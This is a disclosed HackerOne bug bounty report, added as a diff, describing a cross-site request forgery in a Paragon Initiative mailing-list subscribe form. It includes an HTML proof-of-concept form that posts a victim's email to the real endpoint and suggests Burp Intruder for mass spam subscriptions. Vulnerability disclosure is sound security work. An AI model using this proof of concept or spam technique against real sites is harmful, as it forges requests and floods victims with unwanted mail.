@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/115323
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/kiraak-boy
+ReportedTo:Paragon Initiative Enterprises(paragonie)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:05.05.2016 7:22:33
+
+Summary:
+
+Hello,
+
+You Have Subscribe Form At  http://paragonie.us11.list-manage2.com/subscribe?u=260ff2c88e0a7e103f01ccd79&id=8ddb8569ca
+
+When We Enter Details And Click on Subscribe.
+
+We Get Following Request
+
+<html>
+  <body>
+    <form action="http://paragonie.us11.list-manage.com/subscribe/post" method="POST">
+      <input type="hidden" name="u" value="260ff2c88e0a7e103f01ccd79" />
+      <input type="hidden" name="id" value="8ddb8569ca" />
+      <input type="hidden" name="MERGE0" value="victim@gmail.com" />
+      <input type="hidden" name="MERGE1" value="arbaz" />
+      <input type="hidden" name="MERGE2" value="hussain" />
+      <input type="hidden" name="MERGE3" value="google" />
+      <input type="hidden" name="EMAILTYPE" value="html" />
+      <input type="hidden" name="b&#95;260ff2c88e0a7e103f01ccd79&#95;8ddb8569ca" value="" />
+      <input type="hidden" name="submit" value="Subscribe&#32;to&#32;list" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Just Try to Add Email ('MERGE0') And Pass the Request , Attacker can Also send that Form Request to Burp Intruder by Adding Email List To Send Confirmation Link to ALL  as Spam Or He Can Perform CSRF attack TO Send Confirmation By Using Above POC Code,
+
+
+Thanks!
